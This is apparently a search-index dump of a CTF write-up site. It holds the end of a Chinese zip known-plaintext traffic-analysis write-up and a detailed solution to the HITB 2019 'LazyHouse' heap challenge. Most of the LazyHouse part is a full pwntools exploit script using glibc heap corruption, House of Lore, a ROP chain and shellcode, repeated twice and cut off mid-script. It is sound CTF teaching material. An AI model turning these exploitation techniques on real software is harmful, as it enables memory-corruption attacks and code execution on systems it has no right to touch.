\u6211\u4eec\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u770b\u5230\u6587\u4ef6\u91cc\u9762\u6709flag.txt\u548cReadme.txt\uff0c\u4f46\u662f\u6709\u5bc6\u7801\uff0c\u5e94\u8be5\u4e0d\u662f\u8ba9\u6211\u4eec\u7206\u7834\u3002\u6b63\u5e38\u6765\u8bf4\u53ea\u9700\u8981flag.txt\u5373\u53ef\uff0cReadme.txt\u663e\u5f97\u6709\u4e9b\u591a\u4f59\uff0c\u4e8e\u662f\u60f3\u5230zip\u660e\u6587\u653b\u51fb\u3002 \u91cd\u65b0\u56de\u5230\u653b\u51fb\u6d41\u91cf\u4e2d\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u5728\u6ce8\u5165\u4e4b\u540e\u8fd8\u6709\u591a\u4f59\u7684\u64cd\u4f5c\uff0c\u4e3b\u8981\u662f\u8bfb\u53d6\u6587\u4ef6\u5939\u548c\u8bfb\u53d6\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5176\u4e2d\u6709\u4e00\u6b65\u8bfb\u53d6\u4e86Readme.7z\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5c06\u8fd4\u56de\u7684\u5b57\u8282\u6d41\u5bfc\u51fa\u5230Readme.7z\u6587\u4ef6\u4e2d\u3002 \u63a5\u7740\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u6709\u4e00\u4e2aReadme.txt\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u5bf9\u5176\u5229\u7528zip\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230\u5bc6\u7801**CtF36o!s0** \u7528\u6539\u5bc6\u7801\u89e3\u5f00flag.zip\u5373\u53ef\u5f97\u5230flag flag{1d0ea6a36f6aaf7fa5d4b007454227d6}","title":"360CTF \u6d41\u91cf\u5206\u6790\u9898WriteUp"},{"location":"pwn/","text":"waiting","title":"home"},{"location":"pwn/#waiting","text":"","title":"waiting"},{"location":"pwn/Heap/LazyHouse/","text":"LazyHouse HITB Qual 2019 Vulnerability Type Confusion The value of (int64_t size) is cast to uint64 , and the high bits (higher than 64) of the result of imul can be ignored. For Example, if we enter a value 0x13f69b02593f69b1 as size of a house. We can make the result of imul to be very small, which is the money we need to pay for the house. After that, if we sell the house, we will get as much money as size 6 . In one word, we enter a size for house and then sell the house, we will get as much money as -((uint64_t)(size * 0xda) 0xffffffffffffffff) + (uint64_t)(size 6) . We fraudulently obtain money without paying anything~ Heap Overflow Only twice We can make a 32 bytes heap overflow when we upgrade a house. Diffifulty Calloc We can only buy a normal house and get a chunk allocated buy function calloc . If we want to use malloc, we need to buy a super house . The differences between malloc and calloc are shown as follows. - calloc will not use tcache bins for allocation. For __libc_malloc For __libc_calloc And, _int_malloc will directly search fastbins for allocating rather than searching tcache bins firstly. calloc will zero the memory got from __int_malloc . Glibc 2.29 Glibc2.28 disallowed unsotedbin attack for arbitrary address writing. So, it is not easy to overwrite global_max_fast to fuck chunks and bins of any size into the range of fastbins. Glibc2.29 disallowed house of force . Exploit Get Enough Money I play the trick mentioned before to get the money close to 0xffffffffffffffff for further exploiting. def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091) Leak If we want to make the address of libc appear in heap, we should make the tcache bins of our size full. It is great that calloc does not obtain bin from tcache bins. So, we can do buy and sell operation for more then 7 times to fill tcache bins of our size up. make tcache size 0x217 full or i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) The distribution of the chunks is shown as follows. Then, I use house 0 to make the overflow to overwrite the size of the chunk at 0x15d0 to 0x8d1 . #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) Then, I fill the tcache of size (0x90 + 0x10) up, and I make 4 chunk of this size, which will be free into unsorted bins. for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) Than, I free the chunk(the size of which is overwrite with 0x8d1) at 0x15d0. So a big unsorted bin is list. sell(1) Then, I calloc the chunk of (0x8d0 - 0x10) to get the chunk again. Which is the most import is that, we then free the chunk of house 4 and house 6 to make them into unsorted bins. buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) And show house 1 to get heap address and libc address . #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base))) House of Lore I use house of lore to fuck the tcache struct in heap range to reach the goal of arbitrary writing. Firstly, I sell the bit chunk and buy the chunk to change the value overlapped by this chunk. This is really usefull in the consistance that we can only upgrade houses for twice. By modifying chunks, we can make the change the size of the chunk of house 2 to 0x21 and the size of the chunk of house 7 to 0x31. sell(1) buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) After we free the chunk of house 2 and the chunk of house 7 , we get 2 bin pointer at heap_base + 0x50, which is quite useful for house of lore attack. We sell the chunk of house 1 , that big chunk, for further making a small bin at the address of that 0x21 tcache chunk. (The pointer in tcache struct is chunk + 0x10 ) We buy a chunk, the size of which is (0xb0 + 0x10), to make the top chunk start at the address of that 0x21 tcache bin. GREAT~ buy_house(1, 0xb0, \\x11 * 0xb0) Obtain the small bin in smallbins to clean the smallbins. buy_house(2, 0x90, \\x22 * 0x90) Obtain a size of 0x220 at the address of that 0x21 tcache bin. buy_house(6, 0x217, \\x66 * 0x90) So, it is good for the check for smallbins list. p- BK- prev == p . We then get a smallbin chunk to avoid being merging with top_chunk. buy_house(4, 0x217, \\x44 * 0x90) A great trick. We calloc a (0x3a0 + 0x10) size chunk and free it into tcache to make the bitmap to be 0x100. It is really usefull for this challenge, since we can only use calloc , we need to zero memory with the size of the fake chunk (0 is really not good). buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) Then we make the second overflow to do house of lore attack, modify p- bk to fake_chunk . upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) Which is still important is that we need to make p- bk- bk- prev == p- bk . Do you remember that we have a tcache bin of 0x30? Good. We just need to set the fd of that chunk to be heap_base + 0x40 . The great trick of setting bitmap to 0x100 has aslo meet that requirement. buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) At last, we just need to calloc the modified bin out and then we will get the chunk at heap_base + 0x40 , which is the struct of tcache. We can change the header of the tcache bin list whose size is 0x220 to __calloc_hook and buy a big house (use malloc). We can make ROP_CHAIN when we buy the house. It is interesting that when we call __calloc_hook , the register rbp is the same value as size. So, we change __calloc_hook to a Gadget leave; ret to do ROP at the ROP_CHAIN by calloc( heap_chunk + ?). EXP from pwn import * local=1 pc= ./lazyhouse aslr=True context.log_level= debug context.word_size = 64 context.os = linux context.endian = little libc=ELF( ./libc.so.6 ) if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./ld-linux-x86-64.so.2 , LD_LIBRARY_PATH : ./ }) p = process(pc,aslr=aslr) #gdb.attach(p, b malloc_printerr ) else: remote_addr=[ 6.6.6.6 , 6666] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) def buy_house(index, size, buf, logging = False): ru( Your choice: ) log.info( target price -- {price} .format(price = hex(size * 0xDA 0xffffffffffffffff))) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) log.info( money_now -- {money_now} .format(money_now = hex(money_now))) ru( Index: ) sl(str(index)) ru( Size: ) sl(str(size)) ru( Price: ) log.info( price -- {price} .format(price = hex(int(rl().strip())))) if logging == True: return if(p.read(6) != House: ): rl() log.critical( fucked a really big house ) return sn(buf) def show_house(index, reading = True): ru( Your choice: ) sl( 2 ) ru( Index: ) sl(str(index)) if reading == True: return ru( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )[:-len( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )] def upgrade(index, buf): ru( Your choice: ) sl( 4 ) ru( Index: ) sl(str(index)) ru( House: ) sn(buf) def sell(index): ru( Your choice: ) sl( 3 ) ru( Index: ) sl(str(index)) def check_money(): ru( Your choice: ) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) #log.critical( money_now -- {money} .format(money = hex(money_now))) ru( Index: ) sl( 7 ) ru( Size: ) sl(str(0x10)) #log.critical( max calloc -- {money} .format(money = hex(money_now / 0xda))) return money_now def buy_super(buf): ru( Your choice: ) sl( 5 ) ru( House: ) sn(buf) def show_super(): ru( Your choice: ) sl( 6 ) ru( Here is supper house:\\n ) return p.read(0x217) def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) if __name__ == __main__ : fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091) #make tcache size 0x217 full for i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) #chunk after tcache and before tmp tcache bins buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) #a big chunk sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base))) sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) buy_house(1, 0xb0, \\x11 * 0xb0) buy_house(2, 0x90, \\x22 * 0x90) buy_house(6, 0x217, \\x66 * 0x90) buy_house(4, 0x217, \\x44 * 0x90) sell(6) #set bitmap to 0x100 buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) pause() #house of lore upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) libc.address = libc_base malloc_hook = libc.symbols[ __malloc_hook ] mprotect = libc.symbols[ mprotect ] leave_ret = libc_base + 0x0000000000058373 pop_rdi_ret = libc_base + 0x0000000000026542 pop_rsi_ret = libc_base + 0x0000000000026f9e pop_rdx_ret = libc_base + 0x000000000012bda6 call_rdx = libc_base + 0x0000000000143650 ROP_CHAIN = p64(pop_rdi_ret) + p64(heap_base) + \\ p64(pop_rsi_ret) + p64(0x4000) + \\ p64(pop_rdx_ret) + p64(7) + p64(mprotect) + \\ p64(pop_rdx_ret) + p64(heap_base + 0x1780) + p64(call_rdx) ROP_CHAIN = ROP_CHAIN.ljust(0x1700 - 0x16a0, \\x90 ) ROP_CHAIN += /flag\\0 ROP_CHAIN = ROP_CHAIN.ljust(0x1780 - 0x16a0, \\x90 ) buffer_addr = heap_base + 0x1700 heap_addr = heap_base + 0x2000 code = asm(pwnlib.shellcraft.amd64.linux.open(buffer_addr, 0, 2).replace( push SYS_open , push 2 )) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_read , rax , heap_addr, 0x100)) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_write , 1 , heap_addr, 0x100).replace( push SYS_write , push 1 )) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_exit , 0)) ROP_CHAIN += code buy_house(6, 0x217, ROP_CHAIN) buy_house(7, 0x217, p64(malloc_hook) * 0x40) buy_super(p64(leave_ret) * 2) sell(1) buy_house(1, heap_base + 0x16a0 - 8, ROP_CHAIN, logging = True) p.interactive()","title":"LazyHouse"},{"location":"pwn/Heap/LazyHouse/#lazyhouse","text":"HITB Qual 2019","title":"LazyHouse"},{"location":"pwn/Heap/LazyHouse/#vulnerability","text":"","title":"Vulnerability"},{"location":"pwn/Heap/LazyHouse/#type-confusion","text":"The value of (int64_t size) is cast to uint64 , and the high bits (higher than 64) of the result of imul can be ignored. For Example, if we enter a value 0x13f69b02593f69b1 as size of a house. We can make the result of imul to be very small, which is the money we need to pay for the house. After that, if we sell the house, we will get as much money as size 6 . In one word, we enter a size for house and then sell the house, we will get as much money as -((uint64_t)(size * 0xda) 0xffffffffffffffff) + (uint64_t)(size 6) . We fraudulently obtain money without paying anything~","title":"Type Confusion"},{"location":"pwn/Heap/LazyHouse/#heap-overflow","text":"Only twice We can make a 32 bytes heap overflow when we upgrade a house.","title":"Heap Overflow"},{"location":"pwn/Heap/LazyHouse/#diffifulty","text":"","title":"Diffifulty"},{"location":"pwn/Heap/LazyHouse/#calloc","text":"We can only buy a normal house and get a chunk allocated buy function calloc . If we want to use malloc, we need to buy a super house . The differences between malloc and calloc are shown as follows. - calloc will not use tcache bins for allocation. For __libc_malloc For __libc_calloc And, _int_malloc will directly search fastbins for allocating rather than searching tcache bins firstly. calloc will zero the memory got from __int_malloc .","title":"Calloc"},{"location":"pwn/Heap/LazyHouse/#glibc-229","text":"Glibc2.28 disallowed unsotedbin attack for arbitrary address writing. So, it is not easy to overwrite global_max_fast to fuck chunks and bins of any size into the range of fastbins. Glibc2.29 disallowed house of force .","title":"Glibc 2.29"},{"location":"pwn/Heap/LazyHouse/#exploit","text":"","title":"Exploit"},{"location":"pwn/Heap/LazyHouse/#get-enough-money","text":"I play the trick mentioned before to get the money close to 0xffffffffffffffff for further exploiting. def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091)","title":"Get Enough Money"},{"location":"pwn/Heap/LazyHouse/#leak","text":"If we want to make the address of libc appear in heap, we should make the tcache bins of our size full. It is great that calloc does not obtain bin from tcache bins. So, we can do buy and sell operation for more then 7 times to fill tcache bins of our size up. make tcache size 0x217 full or i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) The distribution of the chunks is shown as follows. Then, I use house 0 to make the overflow to overwrite the size of the chunk at 0x15d0 to 0x8d1 . #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) Then, I fill the tcache of size (0x90 + 0x10) up, and I make 4 chunk of this size, which will be free into unsorted bins. for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) Than, I free the chunk(the size of which is overwrite with 0x8d1) at 0x15d0. So a big unsorted bin is list. sell(1) Then, I calloc the chunk of (0x8d0 - 0x10) to get the chunk again. Which is the most import is that, we then free the chunk of house 4 and house 6 to make them into unsorted bins. buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) And show house 1 to get heap address and libc address . #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base)))","title":"Leak"},{"location":"pwn/Heap/LazyHouse/#house-of-lore","text":"I use house of lore to fuck the tcache struct in heap range to reach the goal of arbitrary writing. Firstly, I sell the bit chunk and buy the chunk to change the value overlapped by this chunk. This is really usefull in the consistance that we can only upgrade houses for twice. By modifying chunks, we can make the change the size of the chunk of house 2 to 0x21 and the size of the chunk of house 7 to 0x31. sell(1) buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) After we free the chunk of house 2 and the chunk of house 7 , we get 2 bin pointer at heap_base + 0x50, which is quite useful for house of lore attack. We sell the chunk of house 1 , that big chunk, for further making a small bin at the address of that 0x21 tcache chunk. (The pointer in tcache struct is chunk + 0x10 ) We buy a chunk, the size of which is (0xb0 + 0x10), to make the top chunk start at the address of that 0x21 tcache bin. GREAT~ buy_house(1, 0xb0, \\x11 * 0xb0) Obtain the small bin in smallbins to clean the smallbins. buy_house(2, 0x90, \\x22 * 0x90) Obtain a size of 0x220 at the address of that 0x21 tcache bin. buy_house(6, 0x217, \\x66 * 0x90) So, it is good for the check for smallbins list. p- BK- prev == p . We then get a smallbin chunk to avoid being merging with top_chunk. buy_house(4, 0x217, \\x44 * 0x90) A great trick. We calloc a (0x3a0 + 0x10) size chunk and free it into tcache to make the bitmap to be 0x100. It is really usefull for this challenge, since we can only use calloc , we need to zero memory with the size of the fake chunk (0 is really not good). buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) Then we make the second overflow to do house of lore attack, modify p- bk to fake_chunk . upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) Which is still important is that we need to make p- bk- bk- prev == p- bk . Do you remember that we have a tcache bin of 0x30? Good. We just need to set the fd of that chunk to be heap_base + 0x40 . The great trick of setting bitmap to 0x100 has aslo meet that requirement. buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) At last, we just need to calloc the modified bin out and then we will get the chunk at heap_base + 0x40 , which is the struct of tcache. We can change the header of the tcache bin list whose size is 0x220 to __calloc_hook and buy a big house (use malloc). We can make ROP_CHAIN when we buy the house. It is interesting that when we call __calloc_hook , the register rbp is the same value as size. So, we change __calloc_hook to a Gadget leave; ret to do ROP at the ROP_CHAIN by calloc( heap_chunk + ?).","title":"House of Lore"},{"location":"pwn/Heap/LazyHouse/#exp","text":"from pwn import * local=1 pc= ./lazyhouse aslr=True context.log_level= debug context.word_size = 64 context.os = linux context.endian = little libc=ELF( ./libc.so.6 ) if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./ld-linux-x86-64.so.2 , LD_LIBRARY_PATH : ./ }) p = process(pc,aslr=aslr) #gdb.attach(p, b malloc_printerr ) else: remote_addr=[ 6.6.6.6 , 6666] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) def buy_house(index, size, buf, logging = False): ru( Your choice: ) log.info( target price -- {price} .format(price = hex(size * 0xDA 0xffffffffffffffff))) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) log.info( money_now -- {money_now} .format(money_now = hex(money_now))) ru( Index: ) sl(str(index)) ru( Size: ) sl(str(size)) ru( Price: ) log.info( price -- {price} .format(price = hex(int(rl().strip())))) if logging == True: return if(p.read(6) != House: ): rl() log.critical( fucked a really big house ) return sn(buf) def show_house(index, reading = True): ru( Your choice: ) sl( 2 ) ru( Index: ) sl(str(index)) if reading == True: return ru( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )[:-len( $$$$$$$$$$$$$$$$$$$$$$$$$$$$ )] def upgrade(index, buf): ru( Your choice: ) sl( 4 ) ru( Index: ) sl(str(index)) ru( House: ) sn(buf) def sell(index): ru( Your choice: ) sl( 3 ) ru( Index: ) sl(str(index)) def check_money(): ru( Your choice: ) sl( 1 ) ru( Your money: ) money_now = int(rl().strip()) #log.critical( money_now -- {money} .format(money = hex(money_now))) ru( Index: ) sl( 7 ) ru( Size: ) sl(str(0x10)) #log.critical( max calloc -- {money} .format(money = hex(money_now / 0xda))) return money_now def buy_super(buf): ru( Your choice: ) sl( 5 ) ru( House: ) sn(buf) def show_super(): ru( Your choice: ) sl( 6 ) ru( Here is supper house:\\n ) return p.read(0x217) def fuck_money(size): buy_house(7, size, \\x00 ) sell(7) log.critical(hex(check_money())) if __name__ == __main__ : fuck_money(0x13f69b02593f69b1) fuck_money(0x109bb0727572e2bd) fuck_money(0x13f2b1389a662c33) fuck_money(0x4fcace18cee3091) #make tcache size 0x217 full for i in range(0, 7): buy_house(7, 0x217, \\x00 ) sell(7) #chunk after tcache and before tmp tcache bins buy_house(2, 0x80, x * 0x10) sell(2) buy_house(0, 0x400, \\xaa * 0x400) buy_house(1, 0xa0, \\xbb * 0xa0) buy_house(2, 0x90, \\xcc * 0x90) buy_house(3, 0x90, \\xdd * 0x90) #overlapping first upgrade(0, \\xaa * 0x400 + p64(0) + p64(0x8d1)) for i in range(0, 7): buy_house(7, 0x90, \\x11 * 0x90) sell(7) #unsorted bin buy_house(4, 0x90, \\x44 * 0x90) buy_house(5, 0x90, \\x55 * 0x90) buy_house(6, 0x90, \\x66 * 0x90) buy_house(7, 0x90, \\x77 * 0x90) #a big chunk sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0xa1) + \\xcc * 0x90 + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + \\x44 * 0x90 + p64(0) + p64(0xa1) + \\x55 * 0x90 + p64(0) + p64(0xa1) + \\x66 * 0x90 + p64(0) + p64(0xa1) + \\x77 * 0x90 ) #pause() sell(4) sell(6) #leak show_house(1, reading = False) for i in range(0, 10): ru(p64(0xa1)) leaked_libc = u64(p.read(8)) leaked_heap = u64(p.read(8)) libc_base = leaked_libc - 0x1e4ca0 heap_base = leaked_heap - 0x1d60 log.critical( libc_base -- {} .format(hex(libc_base))) log.critical( heap_base -- {} .format(hex(heap_base))) sell(1) #pause() buy_house(1, 0x8c0, \\xbb * 0xa0 + p64(0) + p64(0x21) + \\xcc * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + \\xdd * 0x90 + (p64(0) + p64(0xa1) + \\x11 * 0x90) * 7 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + \\x44 * 0x80 + p64(0) + p64(0x21) + \\x55 * 0x10 + p64(0) + p64(0xa1 - 0x20) + \\x00 * (0x90 - 0x20) + p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + \\x66 * 0x80 + p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 + p64(0) + p64(0xa1 - 0x30) + \\x00 * (0x90 - 0x30) ) #prepare for house of lore sell(2) sell(7) sell(1) buy_house(1, 0xb0, \\x11 * 0xb0) buy_house(2, 0x90, \\x22 * 0x90) buy_house(6, 0x217, \\x66 * 0x90) buy_house(4, 0x217, \\x44 * 0x90) sell(6) #set bitmap to 0x100 buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8)) sell(6) pause() #house of lore upgrade(1, \\x22 * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40)) libc.address = libc_base malloc_hook = libc.symbols[ __malloc_hook ] mprotect = libc.symbols[ mprotect ] leave_ret = libc_base + 0x0000000000058373 pop_rdi_ret = libc_base + 0x0000000000026542 pop_rsi_ret = libc_base + 0x0000000000026f9e pop_rdx_ret = libc_base + 0x000000000012bda6 call_rdx = libc_base + 0x0000000000143650 ROP_CHAIN = p64(pop_rdi_ret) + p64(heap_base) + \\ p64(pop_rsi_ret) + p64(0x4000) + \\ p64(pop_rdx_ret) + p64(7) + p64(mprotect) + \\ p64(pop_rdx_ret) + p64(heap_base + 0x1780) + p64(call_rdx) ROP_CHAIN = ROP_CHAIN.ljust(0x1700 - 0x16a0, \\x90 ) ROP_CHAIN += /flag\\0 ROP_CHAIN = ROP_CHAIN.ljust(0x1780 - 0x16a0, \\x90 ) buffer_addr = heap_base + 0x1700 heap_addr = heap_base + 0x2000 code = asm(pwnlib.shellcraft.amd64.linux.open(buffer_addr, 0, 2).replace( push SYS_open , push 2 )) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_read , rax , heap_addr, 0x100)) code += asm(pwnlib.shellcraft.amd64.linux.syscall( SYS_write , 1 , heap_addr, 0x100).replace( push SYS_write , push 1 )) code += 